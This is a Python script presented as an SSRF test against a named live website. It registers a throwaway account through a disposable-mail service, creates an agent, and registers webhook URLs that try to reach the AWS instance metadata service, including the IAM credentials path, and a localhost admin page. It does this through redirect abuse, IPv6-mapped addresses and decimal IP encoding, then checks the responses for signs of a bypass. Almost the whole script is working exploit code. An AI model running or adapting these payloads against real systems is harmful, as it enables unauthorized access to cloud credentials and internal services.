#!/usr/bin/env python3
"""
SSRF Security Test Script
Tests SSRF vulnerabilities via webhook functionality on aitcommunity.org
"""

import requests
import random
import time
import re
import json
import sys

# ── Configuration ─────────────────────────────────────────────────────────────
BASE_URL = "https://www.aitcommunity.org"
PASSWORD = "T3stSSRF!2024#Pass"
TIMEOUT = 20

random_digits = ''.join([str(random.randint(0, 9)) for _ in range(8)])
USERNAME = f"ssrftest_{random_digits}"
EMAIL = f"{USERNAME}@1secmail.com"

print("=" * 70)
print("SSRF Security Test Script")
print("=" * 70)
print(f"Username : {USERNAME}")
print(f"Email    : {EMAIL}")
print("=" * 70)

session = requests.Session()
session.headers.update({
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (SSRF-Test/1.0)",
})

# ── Helpers ───────────────────────────────────────────────────────────────────

def print_response(label, resp):
    print(f"\n--- {label} ---")
    print(f"Status : {resp.status_code}")
    print(f"Headers: {dict(resp.headers)}")
    try:
        body = resp.json()
        print(f"Body   : {json.dumps(body, indent=2)}")
    except Exception:
        print(f"Body   : {resp.text[:2000]}")
    print()

def post(url, body, **kwargs):
    r = session.post(url, json=body, timeout=TIMEOUT, allow_redirects=True, **kwargs)
    return r

def get(url, **kwargs):
    r = session.get(url, timeout=TIMEOUT, allow_redirects=True, **kwargs)
    return r

# ── Phase 1: Account Setup ────────────────────────────────────────────────────
print("\n[Phase 1] Account Setup & Email Verification")
print("-" * 50)

# Step 1: Register
print(f"\n[1] Registering account …")
reg_body = {"email": EMAIL, "password": PASSWORD, "name": "SSRFTester"}
reg_resp = post(f"{BASE_URL}/api/auth/sign-up/email", reg_body)
print_response("Registration", reg_resp)

# Step 2: Wait for verification email
print("[2] Waiting 10 seconds for verification email …")
time.sleep(10)

def check_inbox(login, domain, max_wait=60):
    """Poll 1secmail inbox until a message arrives or max_wait exceeded."""
    waited = 0
    while waited < max_wait:
        r = requests.get(
            "https://www.1secmail.com/api/v1/",
            params={"action": "getMessages", "login": login, "domain": domain},
            timeout=TIMEOUT,
        )
        print(f"  Inbox check ({waited}s): status={r.status_code}, body={r.text[:200]}")
        try:
            msgs = r.json()
            if isinstance(msgs, list) and len(msgs) > 0:
                return msgs
        except Exception:
            pass
        time.sleep(5)
        waited += 5
    return []

msgs = check_inbox(USERNAME, "1secmail.com", max_wait=60)

if not msgs:
    print("[!] No messages received in inbox. Proceeding anyway (may fail at sign-in).")
    verification_done = False
else:
    msg_id = msgs[0]["id"]
    print(f"\n[3] Reading message ID {msg_id} …")
    read_resp = requests.get(
        "https://www.1secmail.com/api/v1/",
        params={
            "action": "readMessage",
            "login": USERNAME,
            "domain": "1secmail.com",
            "id": msg_id,
        },
        timeout=TIMEOUT,
    )
    print_response("Email Message", read_resp)

    try:
        msg_data = read_resp.json()
        body_text = msg_data.get("body", "") + msg_data.get("htmlBody", "")
    except Exception:
        body_text = read_resp.text

    # Find verification URL
    verify_urls = re.findall(
        r'https?://(?:www\.)?aitcommunity\.org/api/auth/verify-email\?token=[^\s"\'<>]+',
        body_text,
    )
    if not verify_urls:
        # Try URL-decoded variant
        verify_urls = re.findall(
            r'https?://[^\s"\'<>]*verify-email[^\s"\'<>]+',
            body_text,
        )

    print(f"\n[4] Verification URLs found: {verify_urls}")

    verification_done = False
    if verify_urls:
        verify_url = verify_urls[0]
        # Unescape HTML entities if present
        verify_url = verify_url.replace("&amp;", "&")
        print(f"\n[5] Verifying email via: {verify_url}")
        verify_resp = get(verify_url)
        print_response("Email Verification", verify_resp)
        verification_done = True
    else:
        print("[!] Could not find verification URL in email body.")
        verification_done = False

# Step 3: Sign in
print("\n[6] Signing in …")
signin_body = {"email": EMAIL, "password": PASSWORD}
signin_resp = post(f"{BASE_URL}/api/auth/sign-in/email", signin_body)
print_response("Sign-in", signin_resp)

# If 403 / email not verified, wait more and retry
if signin_resp.status_code in (403, 401) or "EMAIL_NOT_VERIFIED" in signin_resp.text:
    print("[!] Email not verified yet. Waiting 15 more seconds and rechecking inbox …")
    time.sleep(15)
    msgs2 = check_inbox(USERNAME, "1secmail.com", max_wait=30)
    if msgs2 and not verification_done:
        msg_id = msgs2[0]["id"]
        read_resp2 = requests.get(
            "https://www.1secmail.com/api/v1/",
            params={"action": "readMessage", "login": USERNAME, "domain": "1secmail.com", "id": msg_id},
            timeout=TIMEOUT,
        )
        body_text2 = ""
        try:
            msg_data2 = read_resp2.json()
            body_text2 = msg_data2.get("body", "") + msg_data2.get("htmlBody", "")
        except Exception:
            body_text2 = read_resp2.text
        verify_urls2 = re.findall(
            r'https?://(?:www\.)?aitcommunity\.org/api/auth/verify-email\?token=[^\s"\'<>]+',
            body_text2,
        )
        if verify_urls2:
            verify_url2 = verify_urls2[0].replace("&amp;", "&")
            print(f"[5b] Verifying email via: {verify_url2}")
            verify_resp2 = get(verify_url2)
            print_response("Email Verification (retry)", verify_resp2)
    print("\n[6b] Retrying sign-in …")
    signin_resp = post(f"{BASE_URL}/api/auth/sign-in/email", signin_body)
    print_response("Sign-in (retry)", signin_resp)

# Inspect cookies
print("\nSession cookies after sign-in:")
for name, value in session.cookies.items():
    display = value[:40] + "…" if len(value) > 40 else value
    print(f"  {name} = {display}")

# ── Phase 2: Create Agent ─────────────────────────────────────────────────────
print("\n[Phase 2] Create Agent Profile")
print("-" * 50)

agent_body = {"json": {"name": "SSRFTester Agent", "visibilityMode": "visible"}}
agent_resp = post(
    f"{BASE_URL}/api/trpc/agentManagement.createAgent",
    agent_body,
)
print_response("createAgent", agent_resp)

# ── Phase 3: SSRF Payload Testing ────────────────────────────────────────────
print("\n[Phase 3] SSRF Payload Testing")
print("=" * 70)

PAYLOADS = [
    {
        "id": "SSRF-VULN-01",
        "description": "Redirect Abuse to AWS IMDSv1",
        "url": "https://httpbin.org/redirect-to?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F",
    },
    {
        "id": "SSRF-VULN-01-variant-IAM",
        "description": "Redirect to IAM credentials",
        "url": "https://httpbin.org/redirect-to?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2Fiam%2Fsecurity-credentials%2F",
    },
    {
        "id": "SSRF-VULN-03",
        "description": "IPv4-mapped IPv6 bypass",
        "url": "https://[::ffff:169.254.169.254]/latest/meta-data/",
    },
    {
        "id": "SSRF-VULN-01-localhost",
        "description": "Redirect to localhost admin",
        "url": "https://httpbin.org/redirect-to?url=http%3A%2F%2F127.0.0.1%3A8080%2Fadmin",
    },
    {
        "id": "SSRF-VULN-01-decimal",
        "description": "Decimal IP encoding of 169.254.169.254",
        "url": "https://httpbin.org/redirect-to?url=http%3A%2F%2F2852039166%2Flatest%2Fmeta-data%2F",
    },
]

results = []

for i, payload in enumerate(PAYLOADS, 1):
    print(f"\n{'=' * 70}")
    print(f"[Payload {i}/{len(PAYLOADS)}] {payload['id']}")
    print(f"Description : {payload['description']}")
    print(f"URL         : {payload['url']}")
    print(f"{'=' * 70}")

    # a) Register the webhook
    webhook_body = {"json": {"url": payload["url"], "categories": ["forum"]}}
    print(f"\n[{i}.a] upsertWebhook …")
    try:
        upsert_resp = post(
            f"{BASE_URL}/api/trpc/agentManagement.upsertWebhook",
            webhook_body,
        )
        print_response(f"upsertWebhook [{payload['id']}]", upsert_resp)
        upsert_ok = upsert_resp.status_code < 400
    except Exception as e:
        print(f"  ERROR in upsertWebhook: {e}")
        upsert_ok = False

    # b) Trigger webhook test
    print(f"\n[{i}.b] testWebhook …")
    try:
        test_resp = post(
            f"{BASE_URL}/api/trpc/agentManagement.testWebhook",
            {},
        )
        print_response(f"testWebhook [{payload['id']}]", test_resp)
        test_body = test_resp.text
    except Exception as e:
        print(f"  ERROR in testWebhook: {e}")
        test_body = str(e)

    # Analyse indicators
    indicators = []
    tb = test_body.lower() if test_body else ""

    if '"success":true' in test_body or '"success": true' in test_body:
        indicators.append("SSRF_SUCCESS: target returned 2xx")
    if "unauthorized" in tb or '"401"' in tb or "401" in tb:
        indicators.append("SSRF_CONFIRMED: reached IMDS, IMDSv2 enforced (401/Unauthorized)")
    if "metadata" in tb:
        indicators.append("METADATA_REFERENCED: metadata keyword in response")
    if "tls" in tb or "ssl" in tb or "certificate" in tb:
        indicators.append("TLS_ERROR: validator bypassed, TLS blocked (SSRF-03 bypass)")
    if "fetch failed" in tb:
        indicators.append("FETCH_FAILED: possible bypass, network-level block")
    if "must not point" in tb or "cloud metadata" in tb:
        indicators.append("BLOCKED: validator caught this payload")
    if "invalid" in tb and "url" in tb:
        indicators.append("BLOCKED: URL validation rejected payload")

    print(f"\n[INDICATORS for {payload['id']}]: {indicators if indicators else ['No clear indicators']}")
    results.append({"payload": payload["id"], "indicators": indicators, "raw": test_body[:500]})

# ── Summary ───────────────────────────────────────────────────────────────────
print("\n" + "=" * 70)
print("FINAL SUMMARY")
print("=" * 70)
for r in results:
    print(f"\n{r['payload']}:")
    for ind in r["indicators"]:
        print(f"  [!] {ind}")
    if not r["indicators"]:
        print("  [ ] No indicators detected")
    print(f"  Raw (first 300 chars): {r['raw'][:300]}")

print("\n[Done]")
